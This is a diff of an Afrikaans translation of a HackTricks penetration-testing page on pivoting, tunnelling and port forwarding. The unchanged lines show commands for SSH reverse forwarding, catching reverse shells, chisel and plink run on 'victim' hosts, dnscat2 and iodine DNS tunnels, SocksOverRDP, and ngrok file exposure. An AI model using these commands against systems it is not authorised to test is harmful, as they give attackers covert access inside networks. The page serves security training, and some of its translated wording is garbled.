@@ -45,9 +45,9 @@ SSH grafiese verbinding (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
-### Plaaslike Port2Port
+### Local Port2Port
 
-Maak nuwe Poort in SSH-bediener --> Ander poort
+Maak nuwe poort in SSH-bediener --> Ander poort
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -69,9 +69,9 @@ Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enigiemand
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Omgekeerde Poort Voorwaartse
+### Reverse Port Forwarding
 
-Dit is nuttig om omgekeerde skale van interne gasheer deur 'n DMZ na jou gasheer te kry:
+Dit is nuttig om omgekeerde shells van interne gasheer deur 'n DMZ na jou gasheer te kry:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -92,7 +92,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Stel forwarding op die bedienerkant in
+Stel forwarding op die bediener-kant in
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -159,7 +159,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-In hierdie geval, die **poort is oop in die beacon gasheer**, nie in die Team Server nie en die verkeer word na die Team Server gestuur en van daar na die aangeduide gasheer:poort
+In hierdie geval, die **poort is oop in die beacon-gasheer**, nie in die Team Server nie en die verkeer word na die Team Server gestuur en van daar na die aangeduide gasheer:poort
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -191,7 +191,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Jy kan dit aflaai vanaf die vrylating bladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Jy moet die **selfde weergawe vir kliënt en bediener** gebruik.
+Jy moet die **selfde weergawe vir kliënt en bediener** gebruik
 
 ### socks
 ```bash
@@ -202,7 +202,7 @@ Jy moet die **selfde weergawe vir kliënt en bediener** gebruik.
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Poort deurstuur
+### Poort forwarding
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -332,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Dit is soos 'n konsole PuTTY weergawe (die opsies is baie soortgelyk aan 'n ssh kliënt).
 
-Aangesien hierdie binêre in die slagoffer uitgevoer sal word en dit 'n ssh kliënt is, moet ons ons ssh diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs 'n plaaslik toeganklike poort na 'n poort in ons masjien te stuur:
+Aangesien hierdie binaire in die slagoffer uitgevoer sal word en dit 'n ssh kliënt is, moet ons ons ssh diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs 'n plaaslik toeganklike poort na 'n poort in ons masjien te stuur:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -366,7 +366,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Nou kan ons **verbinde** met die **slagoffer** oor **RDP** met **`mstsc.exe`**, en ons behoort 'n **prompt** te ontvang wat sê dat die **SocksOverRDP plugin geaktiveer is**, en dit sal **luister** op **127.0.0.1:1080**.
 
-**Verbind** via **RDP** en laai op & voer die `SocksOverRDP-Server.exe` binêre uit op die slagoffer masjien:
+**Verbind** via **RDP** en laai op & voer in die slagoffer masjien die `SocksOverRDP-Server.exe` binêre uit:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -393,8 +393,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, deurgegee word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
-Byvoorbeeld, dit gee die poort 443 deur.
+Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, voortgegee word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
+Byvoorbeeld, dit gee die poort 443 voort.
 ```
 Username Alice
 Password P@ssw0rd
@@ -421,7 +421,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Die tonnel sal baie stadig wees. Jy kan 'n gecomprimeerde SSH-verbinding deur hierdie tonnel skep deur die volgende te gebruik:
+Die tonnel sal baie stadig wees. Jy kan 'n gecomprimeerde SSH-verbinding deur hierdie tonnel skep deur te gebruik:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -445,14 +445,14 @@ Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershel
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Haven forwarding met dnscat**
+#### **Havenoorvering met dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
 #### Verander proxychains DNS
 
-Proxychains onderskep `gethostbyname` libc oproep en tonnel tcp DNS versoek deur die socks proxy. Deur **default** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
+Proxychains onderskep `gethostbyname` libc oproep en tonnel tcp DNS versoek deur die socks proxy. Deur **default** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
 
 ## Tonnels in Go
 
@@ -516,7 +516,7 @@ _Dit is ook moontlik om outentisering en TLS by te voeg, indien nodig._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Lêers blootstel met HTTP
+#### Leker van lêers met HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -538,7 +538,7 @@ Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.
 Dit open 3 tonnels:
 
 * 2 TCP
-* 1 HTTP met statiese lêers blootstelling vanaf /tmp/httpbin/
+* 1 HTTP met statiese lêer blootstelling vanaf /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -557,15 +557,15 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kontroleer die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* Kontroleer die [**intekening planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
